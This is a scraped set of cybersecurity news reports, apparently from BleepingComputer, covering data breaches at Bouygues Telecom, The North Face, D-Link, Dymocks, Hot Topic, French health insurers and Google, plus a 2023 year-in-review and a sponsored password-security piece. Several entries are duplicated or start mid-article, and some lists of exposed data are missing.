ShinyHunters , a high-profile group of threat actors linked to a wide range of breaches that had impacted hundreds of millions of people . In March, PowerSchool also published a CrowdStrike investigation into the incident, which revealed that threat actors had also breached PowerSource in August and September 2024 , using the same compromised credentials. However, the cybersecurity company was unable to find evidence that the same attacker was responsible for all three breaches. Update 9/4/25: Added information about ShinyHunters affiliate.

Bouygues Telecom confirms data breach impacting 6.4 million customers,https://www.bleepingcomputer.com/news/security/bouygues-telecom-confirms-data-breach-impacting-64-million-customers/#comment_form,Bill Toulas,"August 7, 2025","Bouygues Telecom warns it suffered a data breach after the personal information of 6.4 million customers was exposed in a cyberattack. The company is one of the largest telecommunication service providers in France, offering mobile, internet, and IPTV services. Bouygues Telecom has 14.5 million mobile subscribers, 9,000 employees, and an annual revenue of €56.8 billion ($66B). Bouygues Telecom confirmed in a FAQ and a press statement that the attack occurred last Sunday, August 4, 2025. Although Bouygues Telecom says that there has been no impact observed on customer services or networks, the personal data of 6.4 million customers was compromised. ""Bouygues Telecom was the victim of a cyberattack that allowed unauthorized access to certain personal data from 6.4 million customer account,"" reads the translated press statement . ""The situation was resolved as quickly as possible by Bouygues Telecom's technical teams, and all necessary additional measures have been implemented."" A previous statement says that internal investigations confirmed that the attack was orchestrated by a 'known cybercriminal group' that targeted 'specific internal resources.' The firm informed the French National Cybersecurity Agency (ANSSI) and the CNIL (French data protection authority) accordingly, noting that the perpetrator could face up to 5 years of imprisonment and a €150,000 fine for this attack. According to the FAQ, the following customer information was stolen: Importantly, the company said that no credit card numbers or Bouygues Telecom account passwords were compromised. The company has now blocked the attacker's access to its network, increased monitoring, and implemented additional security measures. Customers are being informed of the breach directly via SMS and email, but the situation has exposed them to fraud and phishing risks. Bouygues Telecom urges its customers not to give away sensitive information like their login credentials to people calling them and mentioning their name and account number to gain their trust.

Bouygues Telecom confirms data breach impacting 6.4 million customers,https://www.bleepingcomputer.com/news/security/bouygues-telecom-confirms-data-breach-impacting-64-million-customers/,Bill Toulas,"August 7, 2025","Bouygues Telecom warns it suffered a data breach after the personal information of 6.4 million customers was exposed in a cyberattack. The company is one of the largest telecommunication service providers in France, offering mobile, internet, and IPTV services. Bouygues Telecom has 14.5 million mobile subscribers, 9,000 employees, and an annual revenue of €56.8 billion ($66B). Bouygues Telecom confirmed in a FAQ and a press statement that the attack occurred last Sunday, August 4, 2025. Although Bouygues Telecom says that there has been no impact observed on customer services or networks, the personal data of 6.4 million customers was compromised. ""Bouygues Telecom was the victim of a cyberattack that allowed unauthorized access to certain personal data from 6.4 million customer account,"" reads the translated press statement . ""The situation was resolved as quickly as possible by Bouygues Telecom's technical teams, and all necessary additional measures have been implemented."" A previous statement says that internal investigations confirmed that the attack was orchestrated by a 'known cybercriminal group' that targeted 'specific internal resources.' The firm informed the French National Cybersecurity Agency (ANSSI) and the CNIL (French data protection authority) accordingly, noting that the perpetrator could face up to 5 years of imprisonment and a €150,000 fine for this attack. According to the FAQ, the following customer information was stolen: Importantly, the company said that no credit card numbers or Bouygues Telecom account passwords were compromised. The company has now blocked the attacker's access to its network, increased monitoring, and implemented additional security measures. Customers are being informed of the breach directly via SMS and email, but the situation has exposed them to fraud and phishing risks. Bouygues Telecom urges its customers not to give away sensitive information like their login credentials to people calling them and mentioning their name and account number to gain their trust. Although the leaked IBANs are not enough for initial transfers, impacted individuals are still advised to regularly check their debits and contact their bank immediately if they notice suspicious activity.

The North Face warns customers of April credential stuffing attack,https://www.bleepingcomputer.com/news/security/the-north-face-warns-customers-of-april-credential-stuffing-attack/#comment_form,Bill Toulas,"June 2, 2025","Outdoor apparel retailer The North Face is warning customers that their personal information was stolen in credential stuffing attacks targeting the company's website in April. The North Face is a major American outdoor apparel and equipment brand owned by VF Corporation that also controls Vans, Timberland, and Dickies. The North Face generates over $3 billion in annual revenue, making it one of the largest outdoor brands in the world, with its e-commerce accounting for approximately 42% of its total sales volumes. Credential stuffing attacks are a type of cyberattack where threat actors attempt to gain unauthorized access to user accounts by automating login attempts using username-password pairs previously exposed in data breaches. The technique is possible thanks to ""credentials recycling,"" which is when people use the same username and password across multiple online services. However, if the accounts are protected by multi-factor authentication (MFA), these attacks fail even if the passwords are compromised. The North Face has now begun to send data breach notifications to impacted customers, with a sample notice shared with the Vermont Attorney General that informs customers that it recently suffered a credential stuffing attack. ""On April 23, 2025, we discovered unusual activity involving our website, thenorthface.com, which we investigated immediately,"" reads the notice . ""Following a careful and prompt investigation, we concluded that an attacker had launched a small scale credential stuffing attack against our website on April 23, 2025."" The data that has been exposed includes the following: It is noted that payment information was not exposed, as an external provider handles payments on the site, and The North Face doesn't retain anything but a token required for the process to go through. In the case of The North Face, the decision not to enforce MFA on all accounts has come at a significant cost to its customer base, as this is the fourth credential stuffing incident the brand's site has suffered since 2020. Earlier this year, its parent company, VF Outdoor, informed of a credential stuffing attack impacting 'thenorthface.com' and 'timberland.com,' discovered on March 13, 2025 . That incident exposed 15,700 accounts. Two similar incidents were disclosed in November 2020 and September 2022 , impacting over 200,000 customers. The most severe cybersecurity incident hitting The North Face was a December 2023 ransomware attack that was later confirmed to have impacted 35,000,000 customers . BleepingComputer has contacted The North Face to request more details about the latest incident, including how many customers are impacted, but we are still waiting for a response.

The attacker claims to have stolen source code for D-Link's D-View network management software, along with millions of entries containing personal information of customers and employees, including details on the company's CEO. The stolen data allegedly includes names, emails, addresses, phone numbers, account registration dates, and the users' last sign-in dates. The threat actor provided samples of 45 stolen records with timestamps between 2012 and 2013, which prompted another participant in the thread to comment on the fact that the data looked very old. ""I have breached the internal network of D-Link in Taiwan, I have 3 million lines of customer information, as well as source code to D-View extracted from system,"" the attacker said. ""This does include the information of MANY government officials in Taiwan, as well as the CEOs and employees of the company."" The data has been available for purchase on the hacking forum since October 1st, with the threat actor demanding $500 for the stolen customer information and the alleged D-View source code. D-Link said the security breach occurred due to an employee falling victim to a phishing attack, granting the attacker access to the company's network. In response to the breach, the company immediately shut down potentially impacted servers and disabled all but two user accounts used during the investigation. While it confirmed the breach, D-Link specified that the intruder accessed a product registration system within what it described as a ""test lab environment,"" operating on an outdated D-View 6 system that reached the end of life in 2015. The reason why an end-of-life server was still operational on D-Link’s network, potentially remaining exposed to Internet access for seven years, remains unclear. Contrary to the attacker's claim of stealing millions of users' data, D-Link said the compromised system contained roughly 700 records, with info on accounts that have been for at least seven years. ""Based on the investigations, however, it only contained approximately 700 outdated and fragmented records that had been inactive for at least seven years,"" D-Link said . ""These records originated from a product registration system that reached its end of life in 2015. Furthermore, the majority of the data consisted of low-sensitivity and semi-public information."" D-Link also suspects the threat actor deliberately tampered with the recent login timestamps to create the illusion of a more recent data theft.

The biggest cybersecurity and cyberattack stories of 2023,https://www.bleepingcomputer.com/news/security/the-biggest-cybersecurity-and-cyberattack-stories-of-2023/,Lawrence Abrams,"January 1, 2024","2023 was a big year for cybersecurity, with significant cyberattacks, data breaches, new threat groups emerging, and, of course, zero-day vulnerabilities. Some stories, though, were more impactful or popular with our 22 million readers than others. Below are fourteen of what BleepingComputer believes are the most impactful cybersecurity stories of 2023, with a summary of each. Genetic testing provider 23andMe suffered credential stuffing attacks that led to a major data breach, exposing the data of 6.9 million users. The company states that the attackers only breached a small number of accounts during the credential-stuffing attacks. However, the threat actors were able to abuse other features to scrape millions of individuals' data. The threat actors attempted to sell the stolen data, but after not receiving buyers, leaked the data for 1 million Ashkenazi Jews and 4,011,607 people living in Great Britain on a hacking forum. In a recent update, 23andMe told BleepingComputer that the breach impacted 6.9 million people — 5.5 million through the DNA Relatives feature and 1.4 million through the Family Tree feature. This breach has led to multiple class action lawsuits against the company for not adequately protecting data. Two Danish hosting providers were forced to shut down after a ransomware attack encrypted the majority of customer data, and data restoration was not successful. ""Since we neither can nor wish to meet the financial demands of the criminal hackers for a ransom, CloudNordic's IT team and external experts have been working intensively to assess the damage and determine what could be recovered,"" reads CloudNordic's statement (machine translated) ""Sadly, it has been impossible to recover more data, and the majority of our customers have consequently lost all their data with us."" A hacktivist group known as Anonymous Sudan took everyone by surprise when their DDoS attacks took down the websites and services of some of the largest tech firms in the world. The group's attacks gained wide media attention when they successfully took down login pages for Microsoft's services, including Outlook , OneDrive , and the Azure portal . Over a week later, Microsoft finally confirmed that DDoS attacks caused these outages. ""Beginning in early June 2023, Microsoft identified surges in traffic against some services that temporarily impacted availability,"" confirmed Microsoft . ""Microsoft promptly opened an investigation and subsequently began tracking ongoing DDoS activity by the threat actor that Microsoft tracks as Storm-1359."" Anonymous Sudan later targeted numerous other websites, including those for ChatGPT , Cloudflare , and U.S. government services. The increasing DDoS attacks and their impact led the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to release an advisory about these incidents. A team of researchers from British universities trained a deep learning model to steal data from keyboard keystrokes recorded using a microphone with an accuracy of 95%. When Zoom was used for training the sound classification algorithm, the prediction accuracy dropped to 93%, which is still extremely high. To mitigate these attacks, the researchers suggest users may try altering typing styles or using randomized passwords. Other defense measures include using software to reproduce keystroke sounds, play white noise, or software-based keystroke audio filters. PayPal suffered a credential stuffing attack between December 6 and December 8, 2022, allowing attackers to access 34,942 accounts. Credential stuffing is an attack where hackers attempt to access an account by trying out username and password pairs sourced from data leaks on various websites. Hackers had access to account holders' full names, dates of birth, postal addresses, social security numbers, and individual tax identification numbers. American T.V. giant and satellite broadcast provider DISH Network mysteriously went offline earlier this year, with its websites and mobile apps not working for days. DISH later confirmed that the outage was caused by a ransomware attack , with BleepingComputer first to report that the Black Basta ransomware gang was behind the attack. Employees told BleepingComputer that the ransomware gang compromised the company's Windows domain controllers and encrypted VMware ESXi servers and backups. DISH data breach notifications confirmed that data was stolen in the attack and hinted that a ransom was paid not to release the stolen data. ""We are not aware of any misuse of your information, and we have received confirmation that the extracted data has been deleted,"" read the data breach notification . Web hosting giant GoDaddy says it suffered a multi-year breach allowing unknown attackers to steal source code and install malware on its servers. This breach began in 2021 and allowed the threat actors access to the personal information of 1.2 million Managed WordPress customers, including credentials, and also used the access to redirect websites to other domains. No threat actors ever claimed responsibility for this attack. MGM Resorts International suffered a massive attack that impacted numerous systems, including its main website, online reservations, and in-casino services, like ATMs, slot machines, and credit card machines. The BlackCat ransomware operation claimed the attack, whose affiliates said they encrypted over 100 ESXi hypervisors during the incident. Bloomberg reported that the same group also breached Caesars Entertainment's network , providing a strong hint in a Form 8-K SEC filing that they paid the attackers to prevent a leak of customers' stolen data. While the attack was significant, it also brought wide attention to a loose-knit group of hackers known as Scattered Spider. Scattered Spider, also known as 0ktapus , Starfraud, UNC3944 , and Muddled Libra , is adept at social engineering and relies on phishing, multi-factor authentication (MFA) bombing (targeted MFA fatigue), and SIM swapping to gain initial network access on large organizations. Members of this collective are affiliates of the BlackCat ransomware gang and include young English-speaking members with diverse skill sets who frequent the same hacking forums and Telegram channels. While many believe this is a cohesive gang, the group is a network of individuals, with different threat actors participating in each attack. This fluid structure is what makes it challenging to track them. In November, the FBI released an advisory highlighting the group's tactics, techniques, and procedures (TTPs). Scattered Spider is behind previous attacks on Reddit , MailChimp , Twilio , DoorDash , and Riot Games . 3CX was breached by the North Korean Lazarus hacking group to push malware through a supply chain attack using the company's Voice Over Internet Protocol (VOIP) desktop client. 3CX is a VoIP IPBX software development company whose 3CX Phone System is used by more than 350,000 companies worldwide and has over 12 million daily users. 3CX was breached after an employee installed a trojanized version of Trading Technologies' X_TRADER software, which allowed the threat actors to steal corporate credentials and breach the network . The attackers pushed out a malicious software update that installed a previously unknown information-stealing malware to steal data and credentials stored in Chrome, Edge, Brave, and Firefox user profiles. In May, Barracuda disclosed that some of their Email Security Gateway (ESG) appliances were hacked using a zero-day vulnerability to install malware and steal data. We later learned that the attacks were linked to Chinese threat actors , who used the vulnerability since 2022 to infect ESG devices with new malware named 'Saltwater,' 'Seaspy,' and 'Seaside.' CISA later disclosed that Submarine and Whirlpool malware were also used in the attacks to backdoor ESG devices. What stood out from these attacks is that instead of using a software fix for impacted ESG devices, Barracuda warned customers they must replace their Email Security Gateway (ESG) appliances , which was done free of charge. ""Impacted ESG appliances must be immediately replaced regardless of patch version level,"" the company warned at the time. ""Barracuda's remediation recommendation at this time is full replacement of the impacted ESG."" This unusual request led many to believe that the threat actors compromised the devices at a low level, making it impossible to ensure they were completely clean. Mandiant, who was part of the incident response in these attacks, told BleepingComputer that this was recommended out of caution, as Barracuda could not ensure the complete removal of malware. In February 2023, a massive ransomware campaign targeted exposed VMware ESXi servers worldwide, quickly encrypting the virtual machines for thousands of companies. Just hours after the attack, victims began reporting in the BleepingComputer's forum that files with vmxf, .vmx, .vmdk, .vmsd, and .nvram, all files associated with VMware ESXi virtual machines, were encrypted. The ransomware campaign was dubbed ESXiArgs due to an .args file being created for every encrypted file. The VMware ESXi console home page was modified to show a ransom note demanding 2.0781 bitcoins, worth approximately $49,000 at the time. One of BleepingComputer's most-read stories of the year was the news that the Brazilian National Telecommunications Agency seized incoming Flipper Zero purchases for their potential to be used in criminal activity. Brazilians who purchased the Flipper Zero reported that their shipments were redirected to Brazil's telecommunications agency, Anatel, due to a lack of certification with the country's Radio Frequencies department. From emails seen by BleepingComputer, Anatel flagged the device as a tool used for criminal purposes. In June, researchers from Kaspersky first disclosed a new zero-click iOS attack called "" Operation Triangulation "" used to install the TriangleDB spyware on iPhones. Kaspersky discovered the attack on devices within its own network, and Russia's FSB intelligence service accused Apple of providing the NSA with a backdoor. However, the true origins of the attack remain unknown, and there is no proof that the U.S. government is behind the attacks. The attacks start with the hackers sending a malicious iMessage attachment that, when processed by iOS, automatically triggers a zero-click exploit chain. A zero-click exploit means it does not require interaction from the user to be triggered. The attacks chained together four zero-day iOS vulnerabilities listed below to install the spyware: Last week, Kaspersky disclosed that the final zero-day vulnerability, CVE-2023-38606, abused an undocumented feature in Apple chips to bypass hardware-based security protections. While the Operation Triangulation attacks did not impact many devices, it could be one of the most sophisticated iOS attacks seen to date. While it's still unknown who is behind the attacks, their sophistication has led cybersecurity researchers to believe that a government-sponsored hacking group is behind them. BleepingComputer was the first to report the widespread data-theft attacks exploiting a zero-day vulnerability in the MOVEit Transfer secure file transfer platform. MOVEit Transfer is a managed file transfer (MFT) solution developed by Ipswitch, a subsidiary of US-based Progress Software Corporation, that allows the enterprise to securely transfer files between business partners and customers using SFTP, SCP, and HTTP-based uploads. While the vulnerability was patched in May 2023, the threat actors had already utilized it as a zero-day to breach MOVEit Transfer servers and download the stored data. The attacks were soon claimed by the Clop ransomware gang , who previously launched similar attacks through zero-day vulnerabilities in Accellion FTA and GoAnywhere . According to Emsisoft , 2,706 organizations were breached using this vulnerability, exposing the personal data of over 93 million people. It's budget season!

The California-based manufacturer of upgradeable and modular laptops says a Keating Consulting accountant was tricked on January 11 by a threat actor impersonating Framework's CEO into sharing a spreadsheet containing customers' personally identifiable information (PII) ""associated with outstanding balances for Framework purchases."" ""On January 9th, at 4:27am PST, the attacker sent an email to the accountant impersonating our CEO asking for Accounts Receivable information pertaining to outstanding balances for Framework purchases,"" the company says in data breach notification letters sent to affected individuals. ""On January 11th at 8:13am PST, the accountant responded to the attacker and provided a spreadsheet with the following information: Full Name, Email Address, Balance Owed. ""Note that this list was primarily of a subset of open pre-orders, but some completed past orders with pending accounting syncs were also included in this list."" Framework says its Head of Finance notified Keating Consulting's leadership of the attack once he became aware of the breach roughly 29 minutes after the external accountant replied to the attacker's emails at 8:42 AM PST on January 11th. As part of a subsequent investigation, the company identified all customers whose information was exposed in the attack and notified them of the incident via email. Since the exposed data includes the names of customers, their email addresses, and their outstanding balances, it could potentially be used in phishing attacks that impersonate the company to request payment information or redirect to malicious websites designed to gather even more sensitive information from those impacted. The company added that it only sends emails from 'support@frame.work' asking customers to update their information when a payment has failed and it never asks for payment information via email. Customers are urged to contact the company's support team about any suspicious emails they receive. Framework says that from now on, all Keating Consulting employees with access to Framework customer information will be required to have mandatory phishing and social engineering attack training.

Dymocks Booksellers suffers data breach impacting 836k customers,https://www.bleepingcomputer.com/news/security/dymocks-booksellers-suffers-data-breach-impacting-836k-customers/#comment_form,Bill Toulas,"September 8, 2023","Dymocks Booksellers is warning customers their personal information was exposed in a data breach after the company's database was shared on hacking forums. Dymocks is a bookstore chain operating 65 stores in Australia, New Zealand, and Hong Kong, and also an online shop that sells printed books, e-books, stationery supplies, games, and digital media. The company was informed that its customer data was stolen on September 6th, 2023, by Troy Hunt, the creator of the data breach notification service 'Have I Been Pwned' (HIBP), after a threat actor released it on a hacking forum. In a notice posted to Dymocks' website , the book retailer explains that they see no evidence of penetration on its computer systems, and they're currently investigating a potential security breach on third-party partners. As such, how the data was obtained, the duration of unauthorized access, the extent of malicious activity, and the exact scope of the impact of this incident remain unclear. The investigation carried out by Dymocks and contracted experts has so far confirmed that the following types of customer information have been compromised: Dymocks clarified that it does not store customer financial information, so no such details have been exposed. Have I Been Pwned has confirmed that the data leaked online consists of 1.2 million user records for 836,120 unique Dymocks accounts. All relevant authorities have been notified about the incident, and Dymocks is currently working towards completing its investigation and implementing additional security measures to prevent such incidents from occurring in the future. Also, Dymocks assures clients that it is still safe to make purchases on its online shop. However, it recommends that users change their account password. Troy Hunt reports that Dymocks customer data has been circulated in various Telegram channels and hacking forums since at least June 2023. That said, cybercriminals had plenty of opportunity to exploit the leaked dataset in phishing and scamming attacks targeting the bookstore's clients. BleepingComputer has found a post on one of the BreachForums hacking forum's latest reboots posted on September 3rd, 2023, offering access to the stolen database to other forum members for a few dollars. While it does not appear that passwords were exposed in the Dymocks data breach, it is strongly advised that users change their passwords on the site to be safe. Furthermore, if the same password was used at other sites, it should also be changed there. When changing your passwords, use a unique and strong password at every site so that a data breach does not affect your account at other companies. A password manager can make it much easier to use unique passwords at every site and is highly recommended. Finally, as this data was essentially released for free, Dymocks customers should be on the lookout for emails asking for a credit card or login information, as it could be targeted phishing scams resulting from this data breach. As MCP (Model Context Protocol) becomes the standard for connecting LLMs to tools and data, security teams are moving fast to keep these new services safe.

The company was informed that its customer data was stolen on September 6th, 2023, by Troy Hunt, the creator of the data breach notification service 'Have I Been Pwned' (HIBP), after a threat actor released it on a hacking forum. In a notice posted to Dymocks' website , the book retailer explains that they see no evidence of penetration on its computer systems, and they're currently investigating a potential security breach on third-party partners. As such, how the data was obtained, the duration of unauthorized access, the extent of malicious activity, and the exact scope of the impact of this incident remain unclear. The investigation carried out by Dymocks and contracted experts has so far confirmed that the following types of customer information have been compromised: Dymocks clarified that it does not store customer financial information, so no such details have been exposed. Have I Been Pwned has confirmed that the data leaked online consists of 1.2 million user records for 836,120 unique Dymocks accounts. All relevant authorities have been notified about the incident, and Dymocks is currently working towards completing its investigation and implementing additional security measures to prevent such incidents from occurring in the future. Also, Dymocks assures clients that it is still safe to make purchases on its online shop. However, it recommends that users change their account password. Troy Hunt reports that Dymocks customer data has been circulated in various Telegram channels and hacking forums since at least June 2023. That said, cybercriminals had plenty of opportunity to exploit the leaked dataset in phishing and scamming attacks targeting the bookstore's clients. BleepingComputer has found a post on one of the BreachForums hacking forum's latest reboots posted on September 3rd, 2023, offering access to the stolen database to other forum members for a few dollars. While it does not appear that passwords were exposed in the Dymocks data breach, it is strongly advised that users change their passwords on the site to be safe. Furthermore, if the same password was used at other sites, it should also be changed there. When changing your passwords, use a unique and strong password at every site so that a data breach does not affect your account at other companies. A password manager can make it much easier to use unique passwords at every site and is highly recommended. Finally, as this data was essentially released for free, Dymocks customers should be on the lookout for emails asking for a credit card or login information, as it could be targeted phishing scams resulting from this data breach.

Hot Topic is an American retail chain specializing in counterculture-related clothing, accessories, and licensed music merchandise. The company operates over 640 stores across the United States and Canada, primarily located in shopping malls, and has a vast customer base. According to HIBP , the exposed details include full names, email addresses, dates of birth, phone numbers, physical addresses, purchase history, and partial credit card data for Hot Topic, Box Lunch, and Torrid customers. The security incident was initially claimed on BreachForums by a threat actor named ""Satanic"" on October 21, 2024. The threat actor claimed to have stolen 350 million user records from Hot Topic and its related brands, Box Lunch and Torrid. ""Satanic"" was attempting to sell the database for $20,000 while also demanding a ransom payment of $100,000 from Hot Topic to remove the listing from the forums. At the time, BleepingComputer contacted Hot Topic to ask about the authenticity of the data but received no response. A report from HudsonRock published on October 23 suggested that the breach may have originated from an information stealer malware infection that stole credentials for a data unification service used by Hot Topic. While Hot Topic has remained silent, and no notifications were sent to potentially impacted customers, data analytics firm Atlas Privacy reported last week that the 730GB database actually impacts 54 million customers. Additionally, Atlas clarified that the dataset contains 25 million credit card numbers encrypted with a weak cipher that's easy to break using modern computers. Although Atlas is not 100% certain the database belongs to Hot Topic, it noted that nearly half of all email addresses were not seen in previous breaches, further supporting the legitimacy of the threat actor's claims. Altas says the breach appears to have occurred on October 19, and the data spans from 2011 until that date. The firm has set up a site that allows Hot Topic customers to check if their email address or phone number is exposed in the data leak. Meanwhile, the threat actor continues to sell the database, albeit at a lower price of $4,000.

How SMBs can lower their risk of cyberattacks and data breaches,https://www.bleepingcomputer.com/news/security/how-smbs-can-lower-their-risk-of-cyberattacks-and-data-breaches/,Home,"January 30, 2024","The Akira ransomware group is targeting small to medium-sized businesses (SMBs) - 80% of its victims , since March 2023, have been SMBs. According to Arctic Wolf , the groups ransom demand ranges between $200,000 USD to over $4 million USD. If the organizations refuse to pay, the gang threatens to expose names and data. According to the same source, most intrusions leveraged compromise credentials to obtain initial access. Akira is just one example of the growing security problem for SMBs. While breaches at enterprises may grab the headlines, 56% of SMBs had cyberattacks last year. SMBs are attractive targets for cybercriminals. They typically have fewer resources like IT support, and lack robust security procedures, like employee cybersecurity training. Hackers also target SMBs to find entry points to larger enterprises. Many of the largest breaches in recent years were the result of third-party attacks that started with a smaller company that was digitally connected to another. In 2023, we’ve seen multiple breaches of SMBs that turned into large-scale attacks on major companies, including AT&T , Chic-fil-A , and 1Password . A successful breach can cause significant damage. Globally, the average cost to recover from a data breach is $4.45 million, according to IBM’s Cost of a Data Breach Report 2023 — a 15% increase over the past three years. For SMBs, the average cost of a data breach is nearly $150,000 . Indirect costs can also be significant. Breaches can undermine customer trust and damage reputations. Data may be lost forever. Even when the ransom is paid, nearly 40% of companies are unable to restore their data . Businesses should use best practices for cybersecurity, such as adopting the cybersecurity framework for SMBs developed by the National Institute of Standards and Technology (NIST). According to the framework, SMBs can mitigate risks by: These best practices can help reduce unauthorized access. However, 98% of cyber attacks start with some form of social engineering. If threat actors get their hands on an end-user's valid passwords, they can bypass many of these security measures. So, it is not only crucial to pay close attention to password policies, but to also block known compromised passwords. Enforcing a password policy that helps end-users create stronger passwords and blocks the use of weak and common phrases will make it more difficult for hackers. However, this must go beyond requiring basic password compliance requirements. Specops data shows that 83% of compromised passwords satisfied both length and complexity requirements of regulatory password standards. Password attacks are often successful because users are predictable. They tend to reuse passwords and use similar patterns when creating passwords and trying to meet the complexity requirements. For example, starting with a common word and then following it with a number or special character. Robust password policy enforcement can help users create easy-to-remember, but hard-to-crack passphrases. MFA reduces the risk of account takeovers by adding an additional layer of protection . Even if passwords are compromised, unauthorized users can’t access your network without the second authorization, such as a push notification sent to mobile devices or third-party identity verification providers. This helps mitigate the risk of stolen credentials and brute-force password hacking. The easiest way for cybercriminals to access networks is by using compromised credentials. At any one time, more than 24 billion user names and passwords are for sale on the dark web. You can significantly reduce your risk by blocking the use of known compromised passwords with Specops Password Policy with Breached Password Protection. Conduct password audit scans of your Active Directory with Specops Password Auditor to check end-user accounts against 950 million compromised passwords and other password related vulnerabilities.

How SMBs can lower their risk of cyberattacks and data breaches,https://www.bleepingcomputer.com/news/security/how-smbs-can-lower-their-risk-of-cyberattacks-and-data-breaches/#comment_form,Home,"January 30, 2024","The Akira ransomware group is targeting small to medium-sized businesses (SMBs) - 80% of its victims , since March 2023, have been SMBs. According to Arctic Wolf , the groups ransom demand ranges between $200,000 USD to over $4 million USD. If the organizations refuse to pay, the gang threatens to expose names and data. According to the same source, most intrusions leveraged compromise credentials to obtain initial access. Akira is just one example of the growing security problem for SMBs. While breaches at enterprises may grab the headlines, 56% of SMBs had cyberattacks last year. SMBs are attractive targets for cybercriminals. They typically have fewer resources like IT support, and lack robust security procedures, like employee cybersecurity training. Hackers also target SMBs to find entry points to larger enterprises. Many of the largest breaches in recent years were the result of third-party attacks that started with a smaller company that was digitally connected to another. In 2023, we’ve seen multiple breaches of SMBs that turned into large-scale attacks on major companies, including AT&T , Chic-fil-A , and 1Password . A successful breach can cause significant damage. Globally, the average cost to recover from a data breach is $4.45 million, according to IBM’s Cost of a Data Breach Report 2023 — a 15% increase over the past three years. For SMBs, the average cost of a data breach is nearly $150,000 . Indirect costs can also be significant. Breaches can undermine customer trust and damage reputations. Data may be lost forever. Even when the ransom is paid, nearly 40% of companies are unable to restore their data . Businesses should use best practices for cybersecurity, such as adopting the cybersecurity framework for SMBs developed by the National Institute of Standards and Technology (NIST). According to the framework, SMBs can mitigate risks by: These best practices can help reduce unauthorized access. However, 98% of cyber attacks start with some form of social engineering. If threat actors get their hands on an end-user's valid passwords, they can bypass many of these security measures. So, it is not only crucial to pay close attention to password policies, but to also block known compromised passwords. Enforcing a password policy that helps end-users create stronger passwords and blocks the use of weak and common phrases will make it more difficult for hackers. However, this must go beyond requiring basic password compliance requirements. Specops data shows that 83% of compromised passwords satisfied both length and complexity requirements of regulatory password standards. Password attacks are often successful because users are predictable. They tend to reuse passwords and use similar patterns when creating passwords and trying to meet the complexity requirements. For example, starting with a common word and then following it with a number or special character. Robust password policy enforcement can help users create easy-to-remember, but hard-to-crack passphrases. MFA reduces the risk of account takeovers by adding an additional layer of protection . Even if passwords are compromised, unauthorized users can’t access your network without the second authorization, such as a push notification sent to mobile devices or third-party identity verification providers. This helps mitigate the risk of stolen credentials and brute-force password hacking. The easiest way for cybercriminals to access networks is by using compromised credentials. At any one time, more than 24 billion user names and passwords are for sale on the dark web. You can significantly reduce your risk by blocking the use of known compromised passwords with Specops Password Policy with Breached Password Protection.

Data breaches at Viamedis and Almerys impact 33 million in France,https://www.bleepingcomputer.com/news/security/data-breaches-at-viamedis-and-almerys-impact-33-million-in-france/#comment_form,Bill Toulas,"February 8, 2024","Data breaches at two French healthcare payment service providers, Viamedis and Almerys, have now been determined to impact over 33 million people in the country. Viamedis and Almerys provide healthcare and insurance services in France with technological and administrative solutions to facilitate transactions. They manage the sensitive data of policyholders required for granting reimbursements and generally streamline the payment process in France's complex, multi-layered insurance coverage system. Viamedis first disclosed the cybersecurity incident one week ago on LinkedIn (the company's website remains down), saying that it suffered a data breach impacting beneficiaries and healthcare professionals. The company said the exposure includes names, dates of birth, insurer details, social security numbers, marital status, civil status, and guarantees open to third-party payment. No banking information, email addresses, postal details, or telephone numbers were exposed, as Viamedis said it does not store this type of data on the breached systems. The company serves 20 million insured individuals through the 84 healthcare organizations that use its services, but it opted not to disclose how many of them were impacted by the incident, saying that this is under investigation. The breach on Almerys was initially reported by local news outlets citing anonymous sources, and the firm is yet to release an official statement on the incident. However, the data protection authority in France (CNIL) has now confirmed both data breaches and says that the attacks impacted 33 million people in the country. ""The CNIL was informed by Viamedis and Almerys of the cyberattack they fell victim to at the end of January,"" reads the announcement . ""These operators, who manage the third-party payment for supplementary health insurance, saw the data necessary for their missions compromised during this breach. In total, this data leak concerns more than 33 million people."" This makes the incident one of the most impactful cyberattacks in the country's recent history, impacting nearly half its entire population. Although the exposed data does not include financial info, it is still enough to raise the risk of phishing scams, social engineering, identity theft, and insurance fraud for the exposed individuals. CNIL states that it will ensure that Viamedis and Almerys inform impacted persons directly and individually, as required by the General Data Protection Regulation (GDPR). If you suspect you are among the impacted, it is advisable to keep a close eye on your accounts and treat incoming communications, especially solicitations concerning health insurance cost reimbursements, with suspicion. ""Although contact data was not affected by the breach, it is possible that the data involved in the breach could be combined with other information from previous data leaks,"" warns CNIL. Finally, the data protection authority announced the launch of an investigation into this incident to determine what security measures were in place for the two companies and whether GDPR obligations were met.

""We're writing to let you know about an event that affected a limited set of data in one of Google's corporate Salesforce instances used to communicate with prospective Ads customers,"" reads a data breach notification shared with BleepingComputer. ""Our records indicate basic business contact information and related notes were impacted by this event."" Google says the exposed information includes business names, phone numbers, and ""related notes"" for a Google sales agent to contact them again. The company says that payment information was not exposed and that there is no impact on Ads data in Google Ads Account, Merchant Center, Google Analytics, and other Ads products. The breach was conducted by threat actors known as ShinyHunters, who have been behind an ongoing wave of data theft attacks targeting Salesforce customers. While Google has not shared how many individuals were impacted, ShinyHunters says the stolen information contains approximately 2.55 million data records. It is unclear if there are duplicates within these records. ShinyHunters further told BleepingComputer that they are also working with threat actors associated with ""Scattered Spider, who are responsible for first gaining initial access to targeted systems. ""Like we have said repeatedly already, ShinyHunters and Scattered Spider are one and the same,"" ShinyHunters told BleepingComputer. ""They provide us with initial access and we conduct the dump and exfiltration of the Salesforce CRM instances. Just like we did with Snowflake."" The threat actors are now referring to themselves as ""Sp1d3rHunters,"" to illustrate the overlapping group of people who are involved in these attacks. As part of these attacks, the threat actors conduct social engineering attacks against employees to gain access to credentials or trick them into linking a malicious version of Salesforce's Data Loader OAuth app to the target's Salesforce environment. The threat actors then download the entire Salesforce database and extort the companies via email, threatening to release the stolen data if a ransom is not paid. These Salesforce attacks were first reported by the Google Threat Intelligence Group (GTIG) in June, with the company suffering the same fate a month later. Databreaches.net reported that the threat actors have already sent an extortion demand to Google . After publishing the story, ShinyHunters told BleepingComputer that they demanded 20 Bitcoins, or approximately $2.3 million, from Google to not leak the data. ""I don't care about ransoming Google anyway, I just sent them a bogus email for the lulz of it,"" said the threat actor. ShinyHunters says they have since switched to a new custom tool that makes it easier and quicker to steal data from compromised Salesforce instances.

